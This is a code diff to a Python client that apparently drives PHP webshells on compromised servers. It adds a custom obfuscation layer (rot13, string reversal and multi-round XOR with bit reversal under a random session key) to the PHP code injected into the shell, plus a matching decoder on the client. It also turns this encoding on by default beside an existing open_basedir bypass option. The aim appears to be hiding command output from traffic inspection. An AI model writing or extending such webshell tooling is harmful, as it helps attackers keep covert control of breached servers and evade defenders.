@@ -9,9 +9,10 @@ from random import choice, randint, sample
 from string import ascii_letters, digits
 from subprocess import Popen, check_output
 from types import MethodType
-from urllib.parse import quote
+from urllib.parse import quote,unquote_plus
 from hashlib import md5
 from uuid import uuid4
+from codecs import getencoder
 import zlib
 
 import requests
@@ -29,6 +30,7 @@ SYSTEM_TEMPLATE = None
 Session = requests.Session()
 LOCAL_ENCODING = getpreferredencoding()
 ALPATHNUMERIC = ascii_letters + digits
+RAND_KEY = str(uuid4())
 UNITS = {"B": 1, "KB": 2**10, "MB": 2**20, "GB": 2**30, "TB": 2**40}
 
 
@@ -294,11 +296,36 @@ def execute_sql_command(command, database: str = "", raw: bool = False):
         return form
     return ''
 
+def decode_g(result ,key : str, options : bool):
+    try:
+        s = result.decode()
+    except AttributeError:
+        s = result
+        
+    s = unquote_plus(s,'latin1')
+    rlen = len(s)
+    klen = len(key)
+    keys = [key]
+    
+    for c in range(1,klen):
+        for k in range(klen):
+            key= key[:k] + chr((ord(key[(k + 1)%klen])^ord(key[k]))) + key[k + 1:]
+        keys.append(key)
+
+    for ct in range(klen - 1,-1,-1):
+        kr = keys[ct][::-1]
+        for i in range(rlen):
+            s = s[:i] + chr(int(bin(ord(s[i]) ^ ord(kr[i%klen]))[2:].zfill(8)[::-1],2) ^ ord(keys[ct][i%klen])) + s[i+1:]
+    
+    if(options):
+        return getencoder("rot-13")(s)[0][::-1].encode("latin1")
+    else:
+        return getencoder("rot-13")(s)[0][::-1].encode("latin1").decode("utf8")
 
 def send(phpcode: str, raw: bool = False, **extra_params):
     # extra_params['quiet'] 不显示错误信息
     offset = 8
-    encode_recv = False
+    encode_recv = True
     quiet = False
     if ("quiet" in extra_params):
         del extra_params["quiet"]
@@ -324,7 +351,8 @@ def send(phpcode: str, raw: bool = False, **extra_params):
         encode_tail = """$ooDoo=ob_get_clean();
 $encode = mb_detect_encoding($ooDoo, array('ASCII','UTF-8',"GB2312","GBK",'BIG5','ISO-8859-1','latin1'));
 $ooDoo = mb_convert_encoding($ooDoo, 'UTF-8', $encode);
-print(base64_encode($ooDoo));""" if encode_recv else ""
+function encode_g($result,$key){$easy_en = strrev(str_rot13($result));$rlen = strlen($result);$klen = strlen($key);$s = "";for($c=0;$c<$klen;$c++){$kr = strrev($key);for($i=0;$i<$rlen;$i++){$s[$i] = chr(base_convert(strrev(str_pad(base_convert(ord($easy_en[$i])^ord($key[$i%$klen]),10,2),8,"0",STR_PAD_LEFT)),2,10)^ord($kr[$i%$klen]));}$easy_en = $s;if($c == $klen - 1){break;}for($k=0;$k<$klen;$k++){$key[$k] = chr((ord($key[($k + 1)%$klen])^ord($key[$k])));}}return $s;}
+print(urlencode(encode_g($ooDoo, """ + '"' + RAND_KEY + '"' + """)));""" if encode_recv else ""
         phpcode = f"""error_reporting(0);ob_end_clean();{encode_head}chdir(base64_decode("{pwd_b64}"));print("{head}");""" + phpcode
         if (gget("webshell.bypass_obd", "webshell")):
             phpcode = """$dir=pos(glob("./*", GLOB_ONLYDIR));
@@ -372,8 +400,8 @@ chdir($cwd);rmdir($ndir);""" % (uuid4()) + phpcode
         text = req.text
         content = req.content
     else:
-        text = base64_decode(req.text)
-        content = b64decode(req.content)
+        text = decode_g(req.text,RAND_KEY,False)
+        content = decode_g(req.content,RAND_KEY,True)
     text_head_offset = text.find(head)
     text_tail_offset = text.find(tail)
     text_head_offset = text_head_offset + \
